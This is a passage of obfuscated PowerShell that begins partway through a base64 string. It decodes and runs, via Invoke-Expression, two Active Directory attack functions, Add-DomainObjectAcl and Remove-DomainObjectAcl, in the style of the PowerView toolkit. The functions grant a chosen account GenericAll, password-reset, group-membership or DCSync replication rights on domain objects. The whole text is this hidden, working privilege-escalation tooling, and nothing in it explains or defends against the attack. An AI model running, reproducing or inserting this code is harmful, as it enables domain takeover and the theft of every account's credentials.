01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJywgJ0RDU3luYycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJpZ2h0cyA9ICdBbGwnLAogICAgICAgIFtHdWlkXQogICAgICAgICRSaWdodHNHVUlECiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyA9ICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RhcmdldERvbWFpbiddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVGFyZ2V0RG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUYXJnZXRMREFQRmlsdGVyJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkVGFyZ2V0TERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVGFyZ2V0U2VhcmNoQmFzZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFRhcmdldFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkUHJpbmNpcGFsSWRlbnRpdHkKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJpbmNpcGFsRG9tYWluJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRQcmluY2lwYWxEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRQcmluY2lwYWxzID0gR2V0LURvbWFpbk9iamVjdCBAUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICBpZiAoLW5vdCAkUHJpbmNpcGFscykgewogICAgICAgICAgICB0aHJvdyAiVW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHkiCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFRhcmdldElkZW50aXR5CiAgICAgICAgJFRhcmdldHMgPSBHZXQtRG9tYWluT2JqZWN0IEBUYXJnZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgIEZvckVhY2ggKCRUYXJnZXRPYmplY3QgaW4gJFRhcmdldHMpIHsKICAgICAgICAgICAgJEluaGVyaXRhbmNlVHlwZSA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHlJbmhlcml0YW5jZV0gJ05vbmUnCiAgICAgICAgICAgICRDb250cm9sVHlwZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0gJ0FsbG93JwogICAgICAgICAgICAkQUNFcyA9IEAoKQogICAgICAgICAgICBpZiAoJFJpZ2h0c0dVSUQpIHsKICAgICAgICAgICAgICAgICRHVUlEcyA9IEAoJFJpZ2h0c0dVSUQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkR1VJRHMgPSBTd2l0Y2ggKCRSaWdodHMpIHsKICAgICAgICAgICAgICAgICAgICAnUmVzZXRQYXNzd29yZCcgeyAnMDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1dyaXRlTWVtYmVycycgeyAnYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyJyB9CiAgICAgICAgICAgICAgICAgICAgJ0RDU3luYycgeyAnMTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyJywgJzExMzFmNmFkLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMicsICc4OWU5NWI3Ni00NDRkLTRjNjItOTkxYS0wZmFjYmVkYTY0MGMnfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2ggKCRQcmluY2lwYWxPYmplY3QgaW4gJFByaW5jaXBhbHMpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSAnJFJpZ2h0cycgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHkgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5JZGVudGl0eVJlZmVyZW5jZV0gKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0kUHJpbmNpcGFsT2JqZWN0Lm9iamVjdHNpZCkKICAgICAgICAgICAgICAgICAgICBpZiAoJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRHVUlEIGluICRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0dVSUQgPSBOZXctT2JqZWN0IEd1aWQgJEdVSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFJpZ2h0cyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSAnRXh0ZW5kZWRSaWdodCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBQ0VzICs9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgJElkZW50aXR5LCAkQURSaWdodHMsICRDb250cm9sVHlwZSwgJE5ld0dVSUQsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICdHZW5lcmljQWxsJwogICAgICAgICAgICAgICAgICAgICAgICAkQUNFcyArPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlICRJZGVudGl0eSwgJEFEUmlnaHRzLCAkQ29udHJvbFR5cGUsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEFDRSBpbiAkQUNFcykgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLURvbWFpbk9iamVjdEFjbF0gR3JhbnRpbmcgcHJpbmNpcGFsICQoJFByaW5jaXBhbE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZSkgcmlnaHRzIEdVSUQgJyQoJEFDRS5PYmplY3RUeXBlKScgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkgPSAkVGFyZ2V0T2JqZWN0LkdldERpcmVjdG9yeUVudHJ5KCkKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5PcHRpb25zLlNlY3VyaXR5TWFza3MgPSAnRGFjbCcKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5PYmplY3RTZWN1cml0eS5BZGRBY2Nlc3NSdWxlKCRBQ0UpCiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRFbnRyeS5Qc0Jhc2UuQ29tbWl0Q2hhbmdlcygpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluT2JqZWN0QWNsXSBFcnJvciBncmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSAnJFJpZ2h0cycgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gUmVtb3ZlLURvbWFpbk9iamVjdEFjbCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFRhcmdldElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0RG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0U2VhcmNoQmFzZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJpbmNpcGFsSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJywgJ0RDU3luYycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJpZ2h0cyA9ICdBbGwnLAogICAgICAgIFtHdWlkXQogICAgICAgICRSaWdodHNHVUlECiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyA9ICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RhcmdldERvbWFpbiddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVGFyZ2V0RG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUYXJnZXRMREFQRmlsdGVyJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkVGFyZ2V0TERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVGFyZ2V0U2VhcmNoQmFzZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFRhcmdldFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkUHJpbmNpcGFsSWRlbnRpdHkKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJpbmNpcGFsRG9tYWluJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRQcmluY2lwYWxEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRQcmluY2lwYWxzID0gR2V0LURvbWFpbk9iamVjdCBAUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICBpZiAoLW5vdCAkUHJpbmNpcGFscykgewogICAgICAgICAgICB0aHJvdyAiVW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHkiCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFRhcmdldElkZW50aXR5CiAgICAgICAgJFRhcmdldHMgPSBHZXQtRG9tYWluT2JqZWN0IEBUYXJnZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgIEZvckVhY2ggKCRUYXJnZXRPYmplY3QgaW4gJFRhcmdldHMpIHsKICAgICAgICAgICAgJEluaGVyaXRhbmNlVHlwZSA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHlJbmhlcml0YW5jZV0gJ05vbmUnCiAgICAgICAgICAgICRDb250cm9sVHlwZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0gJ0FsbG93JwogICAgICAgICAgICAkQUNFcyA9IEAoKQogICAgICAgICAgICBpZiAoJFJpZ2h0c0dVSUQpIHsKICAgICAgICAgICAgICAgICRHVUlEcyA9IEAoJFJpZ2h0c0dVSUQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkR1VJRHMgPSBTd2l0Y2ggKCRSaWdodHMpIHsKICAgICAgICAgICAgICAgICAgICAnUmVzZXRQYXNzd29yZCcgeyAnMDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1dyaXRlTWVtYmVycycgeyAnYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyJyB9CiAgICAgICAgICAgICAgICAgICAgJ0RDU3luYycgeyAnMTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyJywgJzExMzFmNmFkLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMicsICc4OWU5NWI3Ni00NDRkLTRjNjItOTkxYS0wZmFjYmVkYTY0MGMnfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2ggKCRQcmluY2lwYWxPYmplY3QgaW4gJFByaW5jaXBhbHMpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluT2JqZWN0QWNsXSBSZW1vdmluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSAnJFJpZ2h0cycgZnJvbSAkKCRUYXJnZXRPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLklkZW50aXR5UmVmZXJlbmNlXSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRQcmluY2lwYWxPYmplY3Qub2JqZWN0c2lkKQogICAgICAgICAgICAgICAgICAgIGlmICgkR1VJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEdVSUQgaW4gJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV3R1VJRCA9IE5ldy1PYmplY3QgR3VpZCAkR1VJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICdFeHRlbmRlZFJpZ2h0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFDRXMgKz0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkSWRlbnRpdHksICRBRFJpZ2h0cywgJENvbnRyb2xUeXBlLCAkTmV3R1VJRCwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkQURSaWdodHMgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVJpZ2h0c10gJ0dlbmVyaWNBbGwnCiAgICAgICAgICAgICAgICAgICAgICAgICRBQ0VzICs9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgJElkZW50aXR5LCAkQURSaWdodHMsICRDb250cm9sVHlwZSwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQUNFIGluICRBQ0VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSByaWdodHMgR1VJRCAnJCgkQUNFLk9iamVjdFR5cGUpJyBvbiAkKCRUYXJnZXRPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRFbnRyeSA9ICRUYXJnZXRPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9wdGlvbnMuU2VjdXJpdHlNYXNrcyA9ICdEYWNsJwogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9iamVjdFNlY3VyaXR5LlJlbW92ZUFjY2Vzc1J1bGUoJEFDRSkKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5Db21taXRDaGFuZ2VzKCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEVycm9yIHJlbW92aW5nIHByaW5jaXBhbCAkKCRQcmluY2lwYWxPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUpICckUmlnaHRzJyBmcm9tICQoJFRhcmdldE9iamVjdC5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

